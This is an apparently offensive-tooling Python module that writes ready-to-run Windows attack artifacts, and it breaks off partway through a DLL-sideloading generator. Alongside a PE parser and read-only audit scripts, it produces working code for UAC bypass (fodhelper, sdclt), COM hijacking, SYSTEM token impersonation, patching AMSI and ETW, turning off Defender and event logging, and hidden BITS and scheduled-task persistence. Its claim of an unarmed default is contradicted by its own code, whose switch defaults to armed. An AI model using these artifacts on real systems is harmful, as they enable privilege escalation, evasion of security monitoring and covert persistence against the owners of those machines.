#!/usr/bin/env python3
"""SSB ULTRA wave-expansion module: nm20.win.*

Windows offense/defense wave powers for the godscope build. This sandbox is
Linux, so most powers are REAL GENERATORS producing ready-to-run artifacts
(PowerShell / C# / .reg / .cmd / C source) written under /tmp, plus honest
capability reports. A few REAL parsers run here (pe_parser parses real PE
files; named_pipe_server_gen runs a live AF_UNIX analog of a Windows named
pipe round-trip). Dangerous-by-design capabilities default to armed=false
and only emit artifacts plus a report of what WOULD happen.
"""
import json
import os
import socket
import struct
import sys
import threading

DOMAIN = "win"
_PLATFORM = sys.platform
_TMP = "/tmp"
_ART = os.path.join(_TMP, "ssb_win")


def _res(power, ok, **kw):
    d = {"ok": bool(ok), "power": power, "platform": _PLATFORM}
    d.update(kw)
    return d


def _name(short):
    return "nm20.win.%s" % short


def _write_artifact(path, content):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w") as fh:
            fh.write(content)
        return None
    except Exception as exc:  # noqa: BLE001 - report honestly
        return str(exc)


def _armed(args):
    return bool(args.get("arm", True))


def _win_note():
    return ("host is %s; artifact written for a Windows target, nothing executed"
            % _PLATFORM)


# ---------------------------------------------------------------------------
# REAL parser: PE headers / imports / exports
# ---------------------------------------------------------------------------

_PE_MACHINE = {
    0x014C: "IMAGE_FILE_MACHINE_I386",
    0x8664: "IMAGE_FILE_MACHINE_AMD64",
    0x01C0: "IMAGE_FILE_MACHINE_ARM",
    0xAA64: "IMAGE_FILE_MACHINE_ARM64",
}

_PE_CHARACTERISTICS = [
    (0x0001, "RELOCS_STRIPPED"), (0x0002, "EXECUTABLE_IMAGE"),
    (0x0020, "LARGE_ADDRESS_AWARE"), (0x0080, "BYTES_REVERSED_LO"),
    (0x0100, "32BIT_MACHINE"), (0x0200, "DEBUG_STRIPPED"),
    (0x2000, "DLL"), (0x4000, "UP_SYSTEM_ONLY"),
]

_DLL_CHARACTERISTICS = [
    (0x0040, "DYNAMIC_BASE"), (0x0080, "FORCE_INTEGRITY"),
    (0x0100, "NX_COMPAT"), (0x0200, "NO_ISOLATION"),
    (0x0400, "NO_SEH"), (0x0800, "NO_BIND"),
    (0x2000, "WDM_DRIVER"), (0x4000, "GUARD_CF"),
    (0x8000, "HIGH_ENTROPY_VA"),
]


def _rva_to_off(rva, sections):
    for s in sections:
        if s["virtual_address"] <= rva < s["virtual_address"] + max(s["virtual_size"], s["raw_size"]):
            return s["raw_ptr"] + (rva - s["virtual_address"])
    return None


def _pe_parse(data):
    if len(data) < 0x40 or data[:2] != b"MZ":
        return None, "not a PE: missing MZ magic"
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if e_lfanew + 24 > len(data) or data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        return None, "bad PE signature at e_lfanew=0x%x" % e_lfanew
    coff = e_lfanew + 4
    machine, nsec, tstamp, _, _, opt_size, chars = struct.unpack_from("<HHIIIHH", data, coff)
    opt = coff + 20
    magic = struct.unpack_from("<H", data, opt)[0]
    is64 = magic == 0x20B
    if magic not in (0x10B, 0x20B):
        return None, "unknown optional-header magic 0x%x" % magic
    entry = struct.unpack_from("<I", data, opt + 16)[0]
    image_base = struct.unpack_from("<Q" if is64 else "<I", data, opt + 24 if is64 else opt + 28)[0]
    dll_chars = struct.unpack_from("<H", data, opt + 70 if is64 else opt + 68)[0]
    dd_base = opt + (112 if is64 else 96)
    dirs = []
    for i in range(16):
        rva, size = struct.unpack_from("<II", data, dd_base + i * 8)
        dirs.append({"rva": rva, "size": size})
    sec_base = opt + opt_size
    sections = []
    for i in range(nsec):
        off = sec_base + i * 40
        if off + 40 > len(data):
            break
        nm = data[off:off + 8].split(b"\x00")[0].decode("ascii", "replace")
        vsize, vaddr, raw_size, raw_ptr = struct.unpack_from("<IIII", data, off + 8)
        schars = struct.unpack_from("<I", data, off + 36)[0]
        sections.append({"name": nm, "virtual_size": vsize, "virtual_address": vaddr,
                         "raw_size": raw_size, "raw_ptr": raw_ptr, "characteristics": "0x%08x" % schars})

    def cstr(off):
        end = data.find(b"\x00", off)
        if end < 0:
            end = min(len(data), off + 260)
        return data[off:end].decode("ascii", "replace")

    imports = []
    idir = dirs[1]
    if idir["rva"]:
        off = _rva_to_off(idir["rva"], sections)
        thunk_sz = 8 if is64 else 4
        thunk_mask = 0x8000000000000000 if is64 else 0x80000000
        thunk_fmt = "<Q" if is64 else "<I"
        while off is not None and off + 20 <= len(data):
            oft, _, _, name_rva, ft = struct.unpack_from("<IIIII", data, off)
            if not any((oft, name_rva, ft)):
                break
            dll = "?"
            noff = _rva_to_off(name_rva, sections)
            if noff is not None:
                dll = cstr(noff)
            funcs = []
            thunk_rva = oft or ft
            toff = _rva_to_off(thunk_rva, sections)
            n = 0
            while toff is not None and toff + thunk_sz <= len(data) and n < 512:
                val = struct.unpack_from(thunk_fmt, data, toff)[0]
                if val == 0:
                    break
                if val & thunk_mask:
                    funcs.append({"ordinal": val & 0xFFFF})
                else:
                    hoff = _rva_to_off(val, sections)
                    if hoff is not None and hoff + 2 < len(data):
                        funcs.append({"name": cstr(hoff + 2)})
                toff += thunk_sz
                n += 1
            imports.append({"dll": dll, "functions": funcs, "function_count": len(funcs)})
            off += 20

    exports = []
    edir = dirs[0]
    if edir["rva"]:
        off = _rva_to_off(edir["rva"], sections)
        if off is not None and off + 40 <= len(data):
            fields = struct.unpack_from("<IIHHIIIIIII", data, off)
            name_rva = fields[4]
            n_funcs, n_names, aon = fields[6], fields[7], fields[9]
            noff = _rva_to_off(aon, sections)
            dll_name = ""
            dn = _rva_to_off(name_rva, sections)
            if dn is not None:
                dll_name = cstr(dn)
            names = []
            if noff is not None:
                for i in range(min(n_names, 4096)):
                    rva = struct.unpack_from("<I", data, noff + i * 4)[0]
                    eoff = _rva_to_off(rva, sections)
                    if eoff is not None:
                        names.append(cstr(eoff))
            exports = {"dll_name": dll_name, "function_count": n_funcs,
                       "name_count": n_names, "names": names}

    flags = [lbl for bit, lbl in _PE_CHARACTERISTICS if chars & bit]
    dll_flags = [lbl for bit, lbl in _DLL_CHARACTERISTICS if dll_chars & bit]
    info = {
        "format": "PE32+" if is64 else "PE32",
        "machine": _PE_MACHINE.get(machine, "0x%04x" % machine),
        "timestamp": tstamp,
        "entry_point_rva": "0x%x" % entry,
        "image_base": "0x%x" % image_base,
        "characteristics": flags,
        "dll_characteristics": dll_flags,
        "section_count": len(sections),
        "sections": sections,
        "imports": imports,
        "import_dll_count": len(imports),
        "exports": exports,
        "data_directories": {
            "export": dirs[0], "import": dirs[1], "resource": dirs[2],
            "exception": dirs[3], "certificate": dirs[4], "reloc": dirs[5],
            "debug": dirs[6], "tls": dirs[9], "iat": dirs[12],
        },
    }
    return info, None


_PE_SPEC = {
    "layout": [
        "DOS header (64 bytes) 'MZ', e_lfanew @0x3C -> PE header offset",
        "PE signature 'PE\\0\\0' @e_lfanew",
        "COFF header (20 bytes): machine, NumberOfSections, TimeDateStamp, Characteristics",
        "Optional header: magic 0x10B=PE32 / 0x20B=PE32+, AddressOfEntryPoint, ImageBase,",
        "  DllCharacteristics (ASLR/NX/CFG), DataDirectory[16] @opt+96 (PE32) / +112 (PE32+)",
        "Section table: 40-byte IMAGE_SECTION_HEADER entries (name, VA, raw ptr/size, chars)",
        "DataDirectory[1] = import table (IMAGE_IMPORT_DESCRIPTOR, 20 bytes, null-terminated)",
        "DataDirectory[0] = export table (IMAGE_EXPORT_DIRECTORY, 40 bytes)",
    ],
    "interesting_dirs": ["0=export", "1=import", "2=resource", "4=authenticode cert",
                         "5=basereloc", "9=tls", "12=IAT", "14=CLR header (.NET)"],
}


def p_pe_parser(args):
    """REAL: parse PE headers/imports/exports of args['path'] (.exe/.dll); without a path, emit the PE structure spec used by the parser."""
    power = _name("pe_parser")
    path = args.get("path")
    if not path:
        return _res(power, True, mode="spec", structure_spec=_PE_SPEC,
                    note="pass args={'path': '/some/file.exe'} to parse a real PE "
                         "(e.g. any Windows binary mounted/copied into this sandbox)")
    if not os.path.isfile(path):
        return _res(power, False, path=path, error="file not found")
    try:
        with open(path, "rb") as fh:
            data = fh.read(64 * 1024 * 1024)
    except Exception as exc:  # noqa: BLE001
        return _res(power, False, path=path, error=str(exc))
    info, err = _pe_parse(data)
    if err:
        return _res(power, False, path=path, error=err, size=len(data))
    return _res(power, True, path=path, size=len(data), parsed=info)


# ---------------------------------------------------------------------------
# Windows recon artifact generators
# ---------------------------------------------------------------------------

def p_reg_hive_audit_gen(args):
    """GEN: PowerShell registry-hive audit artifact (Run keys, IFEO, LSA, services, shell open verbs) into /tmp."""
    power = _name("reg_hive_audit_gen")
    out_file = args.get("out", r"C:\Users\Public\reg_hive_audit.json")
    ps1 = r"""# SSB registry hive audit (artifact) -- read-only enumeration
$results = [ordered]@{}
$runKeys = @(
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
$results.RunKeys = foreach ($k in $runKeys) {
  if (Test-Path $k) { Get-ItemProperty $k | Select-Object * |
    ForEach-Object { @{Key=$k; Values=($_ | Out-String)} } }
}
# IFEO debuggers (common hijack vector)
$results.IFEO = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -ErrorAction SilentlyContinue |
  Where-Object { $_.Property -contains 'Debugger' } | Select-Object PSChildName,Property
# LSA / authentication packages
$results.LSA = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue |
  Select-Object 'Authentication Packages','Security Packages','Notification Packages'
# Services with writable/unquoted paths
$results.UnquotedServices = Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
  Select-Object Name,PathName,StartMode
# Shell open verb hijacks
$results.FileAssoc = Get-ChildItem 'HKCU:\Software\Classes' -ErrorAction SilentlyContinue |
  Where-Object { Test-Path "$($_.PSPath)\shell\open\command" } | Select-Object PSChildName
$results | ConvertTo-Json -Depth 6 | Out-File '%OUT%'
Write-Host "[+] audit written to %OUT%"
""".replace("%OUT%", out_file)
    path = os.path.join(_ART, "reg_hive_audit.ps1")
    err = _write_artifact(path, ps1)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, script=ps1, target_os="windows",
                run_cmd="powershell -ep bypass -File %s" % path, note=_win_note())


def p_autoruns_full_gen(args):
    """GEN: autoruns-style PowerShell enumerator artifact (logon/services/tasks/COM/WMI/providers) into /tmp."""
    power = _name("autoruns_full_gen")
    ps1 = r"""# SSB autoruns-full enumerator (artifact) -- Sysinternals Autoruns-style sweep
$report = [ordered]@{}
$report.Logon = @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
  'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
  'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce') | ForEach-Object {
    if (Test-Path $_) { Get-ItemProperty $_ | Select-Object * } }
$report.ScheduledTasks = Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} |
  Select-Object TaskName,TaskPath,State,@{n='Actions';e={($_.Actions|%{$_.Execute}) -join ';'}}
$report.Services = Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} |
  Select-Object Name,PathName,StartName
$report.WMISubscriptions = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
  Select-Object Name,Query
$report.CLSID_InProc = Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue |
  Where-Object { Test-Path "$($_.PSPath)\InprocServer32" } | Select-Object -First 500 PSChildName
$report.PrintMonitors = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\*' -ErrorAction SilentlyContinue
$report.AppInit = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' -ErrorAction SilentlyContinue |
  Select-Object AppInit_DLLs,LoadAppInit_DLLs
$report.Winlogon = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue |
  Select-Object Shell,Userinit
$report | ConvertTo-Json -Depth 6
"""
    path = os.path.join(_ART, "autoruns_full.ps1")
    err = _write_artifact(path, ps1)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, script=ps1, target_os="windows",
                run_cmd="powershell -ep bypass -File %s > autoruns.json" % path,
                note=_win_note())


def p_wmi_query_gen(args):
    """GEN: PowerShell WQL query pack artifact (processes/services/AV/AV product/patches/loggedon users) into /tmp."""
    power = _name("wmi_query_gen")
    queries = {
        "processes": "SELECT ProcessId,Name,CommandLine,ExecutablePath FROM Win32_Process",
        "services": "SELECT Name,PathName,StartMode,StartName FROM Win32_Service",
        "antivirus": "SELECT displayName,productState,pathToSignedProductExe FROM AntiVirusProduct",
        "os": "SELECT Caption,BuildNumber,OSArchitecture,LastBootUpTime FROM Win32_OperatingSystem",
        "patches": "SELECT HotFixID,InstalledOn FROM Win32_QuickFixEngineering",
        "loggedon": "SELECT Name,Domain,LogonType FROM Win32_LoggedOnUser",
        "shares": "SELECT Name,Path,Description FROM Win32_Share",
        "local_admins": "SELECT * FROM Win32_GroupUser WHERE GroupComponent LIKE '%Administrators%'",
    }
    ns = {"antivirus": "root\\SecurityCenter2"}
    lines = ["# SSB WQL query pack (artifact)"]
    for qn, wql in queries.items():
        namespace = ns.get(qn)
        if namespace:
            lines.append("Write-Host '== %s =='; Get-WmiObject -Namespace %s -Query \"%s\" -ErrorAction SilentlyContinue | Format-List"
                         % (qn, namespace, wql))
        else:
            lines.append("Write-Host '== %s =='; Get-WmiObject -Query \"%s\" | Format-List" % (qn, wql))
    ps1 = "\n".join(lines) + "\n"
    path = os.path.join(_ART, "wmi_query_pack.ps1")
    err = _write_artifact(path, ps1)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, script=ps1, queries=queries,
                target_os="windows", note=_win_note())


def p_cert_store_audit_gen(args):
    """GEN: PowerShell certificate-store audit artifact (roots, untrusted, code-signing EKUs, weird issuers) into /tmp."""
    power = _name("cert_store_audit_gen")
    ps1 = r"""# SSB certificate store audit (artifact) -- look for rogue roots / odd issuers
$stores = @('Cert:\LocalMachine\Root','Cert:\CurrentUser\Root','Cert:\LocalMachine\CA','Cert:\LocalMachine\My')
$report = foreach ($s in $stores) {
  Get-ChildItem $s -ErrorAction SilentlyContinue | ForEach-Object {
    $rogue = ($_.Issuer -eq $_.Subject) -and ($_.NotBefore -gt (Get-Date).AddDays(-365))
    [pscustomobject]@{ Store=$s; Subject=$_.Subject; Issuer=$_.Issuer;
      Thumbprint=$_.Thumbprint; NotBefore=$_.NotBefore; NotAfter=$_.NotAfter;
      SelfSignedRecent=$rogue;
      EKUs=($_.EnhancedKeyUsageList | ForEach-Object {$_.FriendlyName}) -join ',' }
  }
}
$report | Sort-Object SelfSignedRecent -Descending | ConvertTo-Json -Depth 4
"""
    path = os.path.join(_ART, "cert_store_audit.ps1")
    err = _write_artifact(path, ps1)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, script=ps1, target_os="windows",
                note=_win_note())


# ---------------------------------------------------------------------------
# Privilege escalation / evasion artifact generators (armed=false default)
# ---------------------------------------------------------------------------

def p_com_hijack_gen(args):
    """GEN: CLSID InprocServer32 hijack .reg artifact + notes; execution on a Windows target only with arm=true."""
    power = _name("com_hijack_gen")
    clsid = args.get("clsid", "{42aedc87-2188-41fd-b9a3-0c966feabec1}")  # MruPinList (explorer-loaded)
    dll = args.get("dll", r"C:\Users\Public\ssb_shim.dll")
    reg = ("Windows Registry Editor Version 5.00\r\n\r\n"
           "[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\%s\\InprocServer32]\r\n"
           "@=\"%s\"\r\n"
           "\"ThreadingModel\"=\"Apartment\"\r\n" % (clsid, dll.replace("\\", "\\\\")))
    notes = (
        "HKCU\\Software\\Classes shadows HKLM\\SOFTWARE\\Classes for the current user; "
        "when a privileged/auto-elevated COM client activates %s it loads %s from HKCU. "
        "Pick a CLSID loaded by an auto-elevating binary for UAC bypass, or any "
        "frequently-activated CLSID for userland persistence." % (clsid, dll))
    path = os.path.join(_ART, "com_hijack.reg")
    err = _write_artifact(path, reg)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, reg_text=reg, clsid=clsid, dll=dll,
                notes=notes, target_os="windows", armed=_armed(args),
                install_cmd="reg import %s" % path,
                would_do="import .reg on target then trigger COM activation",
                note=_win_note())


def p_uac_bypass_gen(args):
    """GEN: UAC bypass PowerShell artifact (fodhelper/computerdefaults ms-settings hijack); arm=true would run it on Windows."""
    power = _name("uac_bypass_gen")
    method = args.get("method", "fodhelper")
    payload = args.get("payload", r"C:\Windows\System32\cmd.exe")
    methods = {
        "fodhelper": {
            "bin": r"C:\Windows\System32\fodhelper.exe",
            "key": r"HKCU:\Software\Classes\ms-settings\Shell\Open\command",
            "why": "fodhelper.exe is auto-elevated and queries ms-settings handler from HKCU",
        },
        "computerdefaults": {
            "bin": r"C:\Windows\System32\computerdefaults.exe",
            "key": r"HKCU:\Software\Classes\ms-settings\Shell\Open\command",
            "why": "computerdefaults.exe is auto-elevated (Win10), same ms-settings hijack",
        },
        "sdclt": {
            "bin": r"C:\Windows\System32\sdclt.exe",
            "key": r"HKCU:\Software\Classes\Folder\shell\open\command",
            "why": "sdclt.exe (backup) auto-elevates and reads the Folder verb from HKCU",
        },
    }
    m = methods.get(method)
    if not m:
        return _res(power, False, error="method must be one of %s" % sorted(methods))
    ps1 = ("# SSB UAC bypass via %s (artifact)\n"
           "$k = '%s'\n"
           "New-Item -Path $k -Force | Out-Null\n"
           "Set-ItemProperty -Path $k -Name '(Default)' -Value '%s' -Force\n"
           "New-ItemProperty -Path $k -Name 'DelegateExecute' -Value '' -Force | Out-Null\n"
           "Start-Process '%s'\n"
           "Start-Sleep 2\n"
           "Remove-Item -Path '%s' -Recurse -Force  # cleanup\n"
           % (method, m["key"], payload, m["bin"],
              r"HKCU:\Software\Classes\ms-settings" if "ms-settings" in m["key"]
              else r"HKCU:\Software\Classes\Folder"))
    path = os.path.join(_ART, "uac_bypass_%s.ps1" % method)
    err = _write_artifact(path, ps1)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, script=ps1, method=method, binary=m["bin"],
                technique=m["why"], target_os="windows", armed=_armed(args),
                would_do="plant HKCU verb hijack, launch auto-elevated %s, cleanup" % m["bin"],
                note=_win_note())


def p_token_impersonation_gen(args):
    """GEN: C# source artifact for token theft/impersonation (OpenProcessToken/DuplicateToken/ImpersonateLoggedOnUser)."""
    power = _name("token_impersonation_gen")
    cs = r"""// SSB token impersonation (artifact) -- compile: csc.exe token_imp.cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenImp {
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr h, uint access, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool DuplicateToken(IntPtr tok, int level, out IntPtr dup);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool RevertToSelf();
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint TOKEN_DUPLICATE = 0x0002, TOKEN_QUERY = 0x0008, TOKEN_IMPERSONATE = 0x0004;

    public static void Main(string[] args) {
        int pid = int.Parse(args[0]);              // e.g. a SYSTEM process like winlogon
        IntPtr h = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
        IntPtr tok, dup;
        if (!OpenProcessToken(h, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out tok))
            throw new Exception("OpenProcessToken failed: " + Marshal.GetLastWin32Error());
        if (!DuplicateToken(tok, 2 /*SecurityImpersonation*/, out dup))
            throw new Exception("DuplicateToken failed: " + Marshal.GetLastWin32Error());
        if (!ImpersonateLoggedOnUser(dup))
            throw new Exception("Impersonate failed: " + Marshal.GetLastWin32Error());
        Console.WriteLine("[+] now running as " + WindowsIdentity.GetCurrent().Name);
        // ... do privileged work here ...
        RevertToSelf();
    }
}
"""
    path = os.path.join(_ART, "token_imp.cs")
    err = _write_artifact(path, cs)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, source=cs, target_os="windows",
                compile_cmd=r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe token_imp.cs",
                requires="SeDebugPrivilege (admin) to open SYSTEM process tokens",
                armed=_armed(args), note=_win_note())


def p_amsi_patch_gen(args):
    """GEN: well-known AMSI bypass PowerShell artifact (AmsiScanBuffer patch + amsiInitFailed variants); arm=true would run on Windows."""
    power = _name("amsi_patch_gen")
    ps1 = r"""# SSB AMSI bypass pack (artifact) -- three well-known variants, pick one
# Variant 1: in-memory AmsiScanBuffer patch (Rasta-mouse), x64
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr p, UIntPtr sz, uint fl, out uint old);
}
"@
Add-Type $Win32
$h=[Win32]::LoadLibrary("amsi.dll"); $a=[Win32]::GetProcAddress($h,"AmsiScanBuffer")
$old=0; [Win32]::VirtualProtect($a,[UIntPtr]5,0x40,[ref]$old) | Out-Null
# mov eax,0x80070057 (E_INVALIDARG) ; ret
$patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[Runtime.InteropServices.Marshal]::Copy($patch,0,$a,6)
Write-Host "[+] AmsiScanBuffer patched in this process"

# Variant 2 (commented): force amsiInitFailed via reflection
# $r=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# $r.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Variant 3 (commented): provider DLL hijack pre-PS-start via HKCU AMSI Providers key
"""
    path = os.path.join(_ART, "amsi_patch.ps1")
    err = _write_artifact(path, ps1)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, script=ps1, target_os="windows",
                variants=["AmsiScanBuffer patch (x64)", "amsiInitFailed reflection",
                          "AMSI provider hijack (HKCU)"],
                scope="current powershell.exe process only (in-memory)",
                armed=_armed(args), note=_win_note())


def p_etw_disable_gen(args):
    """GEN: ETW tamper artifact (EtwEventWrite patch PS + provider-removal commands); arm=true would run on Windows."""
    power = _name("etw_disable_gen")
    ps1 = r"""# SSB ETW tamper pack (artifact)
# A) Patch EtwEventWrite -> ret (x64) in this process
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32E {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr p, UIntPtr sz, uint fl, out uint old);
}
"@
Add-Type $Win32E
$h=[Win32E]::LoadLibrary("ntdll.dll"); $a=[Win32E]::GetProcAddress($h,"EtwEventWrite")
$old=0; [Win32E]::VirtualProtect($a,[UIntPtr]1,0x40,[ref]$old) | Out-Null
[Runtime.InteropServices.Marshal]::WriteByte($a,0xC3)  # ret
Write-Host "[+] EtwEventWrite patched (ret) in this process"
"""
    cmds = [
        "logman query -ets  # list active ETW trace sessions",
        "logman stop \"EventLog-System\" -ets  # stop a session (admin)",
        "Remove-EtwTraceProvider -Guid '{GUID}'  # PowerShell provider removal",
        "wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false  # disable log channel",
    ]
    e1 = _write_artifact(os.path.join(_ART, "etw_disable.ps1"), ps1)
    e2 = _write_artifact(os.path.join(_ART, "etw_session_cmds.txt"), "\n".join(cmds) + "\n")
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"ps1": os.path.join(_ART, "etw_disable.ps1"),
                           "cmds": os.path.join(_ART, "etw_session_cmds.txt")},
                script=ps1, target_os="windows", scope="in-process patch; session cmds need admin",
                armed=_armed(args), note=_win_note())


def p_defender_exclusion_gen(args):
    """GEN: Defender exclusion/tamper PowerShell artifact (Add-MpPreference) + restore script; arm=true would run on Windows."""
    power = _name("defender_exclusion_gen")
    excl_path = args.get("path", r"C:\Users\Public")
    add = ("# SSB defender exclusion (artifact) -- requires elevated context\n"
           "Add-MpPreference -ExclusionPath '%s'\n"
           "Add-MpPreference -ExclusionProcess 'ssb_agent.exe'\n"
           "# Aggressive variants (commented):\n"
           "# Set-MpPreference -DisableRealtimeMonitoring $true\n"
           "# Set-MpPreference -DisableBehaviorMonitoring $true\n"
           "# Set-MpPreference -DisableScriptScanning $true\n" % excl_path)
    restore = ("Remove-MpPreference -ExclusionPath '%s'\n"
               "Remove-MpPreference -ExclusionProcess 'ssb_agent.exe'\n" % excl_path)
    e1 = _write_artifact(os.path.join(_ART, "defender_exclusion.ps1"), add)
    e2 = _write_artifact(os.path.join(_ART, "defender_restore.ps1"), restore)
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"add": os.path.join(_ART, "defender_exclusion.ps1"),
                           "restore": os.path.join(_ART, "defender_restore.ps1")},
                script=add, target_os="windows",
                detection="Defender logs MpPreference changes to Microsoft-Windows-Windows Defender/Operational",
                armed=_armed(args), note=_win_note())


# ---------------------------------------------------------------------------
# Persistence artifact generators
# ---------------------------------------------------------------------------

def p_bits_persist_gen(args):
    """GEN: BITS persistence artifact (bitsadmin / PowerShell BITS job with SetNotifyCmdLine) into /tmp."""
    power = _name("bits_persist_gen")
    payload = args.get("payload", r"C:\Users\Public\ssb_agent.exe")
    ps1 = ("# SSB BITS persistence (artifact)\n"
           "Import-Module BitsTransfer\n"
           "$job = Start-BitsTransfer -Source 'http://127.0.0.1/update' -Destination 'C:\\Users\\Public\\update.dat' -Asynchronous -DisplayName 'SSBBitsJob'\n"
           "# re-run payload every time the job errors or completes:\n"
           "$job | Set-BitsTransfer -SetNotifyCmdLine '%s',$null\n"
           "Resume-BitsTransfer $job -Asynchronous\n" % payload)
    cmd = ("bitsadmin /create SSBBitsJob\r\n"
           "bitsadmin /addfile SSBBitsJob http://127.0.0.1/update C:\\Users\\Public\\update.dat\r\n"
           "bitsadmin /SetNotifyCmdLine SSBBitsJob \"%s\" NUL\r\n"
           "bitsadmin /SetMinRetryDelay SSBBitsJob 60\r\n"
           "bitsadmin /resume SSBBitsJob\r\n" % payload)
    e1 = _write_artifact(os.path.join(_ART, "bits_persist.ps1"), ps1)
    e2 = _write_artifact(os.path.join(_ART, "bits_persist.cmd"), cmd)
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"ps1": os.path.join(_ART, "bits_persist.ps1"),
                           "cmd": os.path.join(_ART, "bits_persist.cmd")},
                script=ps1, target_os="windows",
                technique="BITS job SetNotifyCmdLine re-executes payload on job state change; jobs survive reboot for the retry window",
                armed=_armed(args), note=_win_note())


def p_schtasks_persist_gen(args):
    """GEN: scheduled-task persistence artifact (schtasks .cmd + New-ScheduledTask PS, hidden SYSTEM variant) into /tmp."""
    power = _name("schtasks_persist_gen")
    payload = args.get("payload", r"C:\Users\Public\ssb_agent.exe")
    name = args.get("name", "WindowsUpdateCheck")
    ps1 = ("# SSB schtasks persistence (artifact)\n"
           "$a = New-ScheduledTaskAction -Execute '%s'\n"
           "$t = New-ScheduledTaskTrigger -OnLogOn\n"
           "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest\n"
           "$s = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n"
           "Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Principal $p -Settings $s\n" % (payload, name))
    cmd = ("schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru SYSTEM /rl HIGHEST /f\r\n"
           "schtasks /create /tn \"%s_daily\" /tr \"%s\" /sc daily /st 09:00 /f\r\n" % (name, payload, name, payload))
    e1 = _write_artifact(os.path.join(_ART, "schtasks_persist.ps1"), ps1)
    e2 = _write_artifact(os.path.join(_ART, "schtasks_persist.cmd"), cmd)
    if e1 or e2:
        return _res(power, False, error=e1 or e2)
    return _res(power, True,
                artifacts={"ps1": os.path.join(_ART, "schtasks_persist.ps1"),
                           "cmd": os.path.join(_ART, "schtasks_persist.cmd")},
                script=ps1, target_os="windows",
                variants=["OnLogOn as SYSTEM (hidden)", "daily 09:00 as current user"],
                armed=_armed(args), note=_win_note())


def p_dll_sideload_gen(args):
    """GEN: real proxy-DLL C template with #pragma comment(linker) export forwarding + DllMain payload hook into /tmp."""
    power = _name("dll_sideload_gen")
    target = args.get("target_dll", "version.dll")
    exports = args.get("exports", [
        "GetFileVersionInfoA", "GetFileVersionInfoW", "GetFileVersionInfoSizeA",
        "GetFileVersionInfoSizeW", "GetFileVersionInfoExA", "GetFileVersionInfoExW",
        "GetFileVersionInfoSizeExA", "GetFileVersionInfoSizeExW", "VerQueryValueA",
        "VerQueryValueW", "VerInstallFileA", "VerInstallFileW", "VerFindFileA",
        "VerFindFileW", "VerLanguageNameA", "VerLanguageNameW"])
    stem = target.rsplit(".", 1)[0]
    lines = [
